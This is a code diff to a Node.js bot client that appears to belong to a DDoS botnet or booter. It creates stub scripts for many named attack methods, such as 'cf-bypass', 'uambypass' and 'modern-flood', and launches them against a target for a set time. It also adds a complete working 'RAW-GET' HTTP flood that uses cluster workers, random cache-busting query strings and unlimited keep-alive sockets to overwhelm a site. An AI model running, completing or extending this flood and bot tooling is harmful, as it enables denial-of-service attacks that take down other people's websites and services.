@@ -109,7 +109,7 @@ function createUaFile() {
   }
 }
 
-// ========== CREATE METHODS DIRECTORY AND STUBS (.cs) ==========
+// ========== CREATE METHODS DIRECTORY AND STUBS (ONLY .JS) ==========
 function createMethodScripts() {
   const methodsDir = path.join(__dirname, 'methods');
   if (!fs.existsSync(methodsDir)) fs.mkdirSync(methodsDir, { recursive: true });
@@ -122,38 +122,55 @@ function createMethodScripts() {
     }
   };
 
-  // FIXED: use toUpperCase() instead of ToUpper
-  const csStub = (name) => `using System;
-class ${name} {
-    static void Main(string[] args) {
-        Console.WriteLine("[${name.toUpperCase()}] Starting attack (C# stub)");
-        int time = args.Length > 1 ? int.Parse(args[1]) : 60;
-        System.Threading.Thread.Sleep(time * 1000);
-        Console.WriteLine("[${name.toUpperCase()}] Attack complete");
-    }
-}`;
+  // Node.js stub for missing methods
+  const jsStub = (name) => `console.log('[${name.toUpperCase()}] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`;
 
-  // List of all methods that are now .cs (from your repo)
-  const csMethods = [
-    'BYPASS', 'R-GOST', 'REX-COSTUM', 'browsersun', 'cf-bypass', 'cibi',
-    'h2-nust', 'h2ca', 'high-dstat', 'http-panel', 'kbrowser', 'modern-flood', 'raw-get'
-  ];
-  for (const m of csMethods) {
-    writeStub(`${m}.cs`, csStub(m));
-  }
-
-  // Keep Node.js stubs for the ones still in .js (R10 series, etc.)
-  const stub = (name) => `console.log('[${name.toUpperCase()}] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`;
   const jsMethods = [
     'nust', 'w-flood1', 'vhold', 'uam', 'wil',
     'r10-rapid', 'r10-tcp', 'r10-tls', 'r10-conn', 'r10-header',
-    'r10-frag', 'r10-pipe', 'r10-cookie', 'r10-mixed', 'r10-lowcpu'
+    'r10-frag', 'r10-pipe', 'r10-cookie', 'r10-mixed', 'r10-lowcpu',
+    'BYPASS', 'R-GOST', 'REX-COSTUM', 'browsersun', 'cf-bypass', 'cibi',
+    'h2-nust', 'h2ca', 'high-dstat', 'http-panel', 'kbrowser', 'modern-flood', 'raw-get'
   ];
   for (const m of jsMethods) {
-    writeStub(`${m}.js`, stub(m));
+    writeStub(`${m}.js`, jsStub(m));
   }
 
-  console.log(color('✅ All method stubs created! (Replace with real .cs / .exe later)\n', colors.green));
+  // RAW-GET full implementation (no proxy)
+  const rawGetJs = `#!/usr/bin/env node
+// RAW-GET Flood - No proxies
+const http = require('http');
+const https = require('https');
+const url = require('url');
+const cluster = require('cluster');
+const args = { target: process.argv[2], time: parseInt(process.argv[3]) || 60, threads: parseInt(process.argv[4]) || 10, rate: parseInt(process.argv[5]) || 1000 };
+const parsed = new URL(args.target);
+const isHttps = parsed.protocol === 'https:';
+const httpLib = isHttps ? https : http;
+const keepAliveAgent = new httpLib.Agent({ keepAlive: true, keepAliveMsecs: 10000, maxSockets: Infinity, maxFreeSockets: 256, timeout: 60000 });
+if (cluster.isMaster) {
+    console.log(\`\\n🔥 RAW-GET (no proxy) | Target: \${args.target} | Time: \${args.time}s | Rate: \${args.rate}/s/worker | Workers: \${args.threads}\`);
+    for (let i = 0; i < args.threads; i++) cluster.fork();
+    setTimeout(() => process.exit(0), args.time * 1000 + 2000);
+} else {
+    let running = true;
+    let requestCount = 0;
+    function sendRequest() {
+        if (!running) return;
+        const options = { hostname: parsed.hostname, port: parsed.port || (isHttps ? 443 : 80), path: parsed.pathname + (parsed.search ? parsed.search + '&' : '?') + Math.random(), method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html', 'Connection': 'keep-alive' }, agent: keepAliveAgent, rejectUnauthorized: false };
+        const req = httpLib.request(options, (res) => { requestCount++; res.resume(); });
+        req.on('error', () => {});
+        req.end();
+    }
+    const intervalMs = 1000 / args.rate;
+    const intervalId = setInterval(() => sendRequest(), intervalMs);
+    setInterval(() => { console.log(\`RPS: \${requestCount}\`); requestCount = 0; }, 1000);
+    setTimeout(() => { running = false; clearInterval(intervalId); process.exit(0); }, args.time * 1000);
+}
+`;
+  writeStub('raw-get.js', rawGetJs);
+
+  console.log(color('✅ All method stubs created! (Replace with real .exe or .js later)\n', colors.green));
 }
 
 // ========== REPORTING FUNCTION ==========
@@ -186,17 +203,28 @@ function getMethodFilename(method) {
     'RAW-HTTP': 'h2-nust',
     'CF-BYPASS': 'cf-bypass',
     'MODERN-FLOOD': 'modern-flood',
-    'RAW-GET': 'raw-get'
+    'RAW-GET': 'raw-get',
+    'BYPASS': 'BYPASS',
+    'R-GOST': 'R-GOST',
+    'browsersun': 'browsersun',
+    'cibi': 'cibi',
+    'h2ca': 'h2ca',
+    'kbrowser': 'kbrowser',
+    'nust': 'nust',
+    'w-flood1': 'w-flood1',
+    'vhold': 'vhold',
+    'wil': 'wil',
+    'tlsop': 'tlsop',
+    'uambypass': 'uambypass'
   };
   if (methodMap[method]) return methodMap[method];
   return method.toLowerCase().replace(/[\s.]+/g, '-');
 }
 
-// ========== EXECUTE A SINGLE COMMAND (supports .exe, .cs, .js) ==========
+// ========== EXECUTE A SINGLE COMMAND (supports .exe and .js only) ==========
 function executeCommand(methodName, target, time, additionalArgs = []) {
   const baseName = getMethodFilename(methodName);
   const exePath = path.join(__dirname, 'methods', `${baseName}.exe`);
-  const csPath = path.join(__dirname, 'methods', `${baseName}.cs`);
   const jsPath = path.join(__dirname, 'methods', `${baseName}.js`);
 
   let command, argsList;
@@ -204,17 +232,13 @@ function executeCommand(methodName, target, time, additionalArgs = []) {
   if (fs.existsSync(exePath)) {
     command = exePath;
     argsList = [target, time, ...additionalArgs];
-    console.log(color(`⚡ EXEC (C# EXE): ${command} ${argsList.join(' ')}`, colors.cyan));
-  } else if (fs.existsSync(csPath)) {
-    command = 'dotnet';
-    argsList = ['run', csPath, target, time, ...additionalArgs];
-    console.log(color(`⚡ EXEC (C# SCRIPT): dotnet run ${csPath} ${target} ${time}`, colors.cyan));
+    console.log(color(`⚡ EXEC (EXE): ${command} ${argsList.join(' ')}`, colors.cyan));
   } else if (fs.existsSync(jsPath)) {
     command = 'node';
     argsList = [jsPath, target, time, ...additionalArgs];
     console.log(color(`⚡ EXEC (NODE.JS): node ${jsPath} ${target} ${time}`, colors.cyan));
   } else {
-    console.log(color(`❌ No executable found for method: ${methodName} (tried .exe, .cs, .js)`, colors.red));
+    console.log(color(`❌ No executable found for method: ${methodName} (tried .exe, .js)`, colors.red));
     return null;
   }
 
@@ -349,7 +373,7 @@ function stopAllAttacks() {
   console.log(color(`✅ All attacks stopped`, colors.green));
 }
 
-// ========== MAIN BOT (rest unchanged) ==========
+// ========== MAIN BOT ==========
 async function startBot() {
   console.log(color('\n🤖 AUTO-REGISTER BOT CLIENT', colors.cyanBright));
   console.log(color('='.repeat(50), colors.cyan));
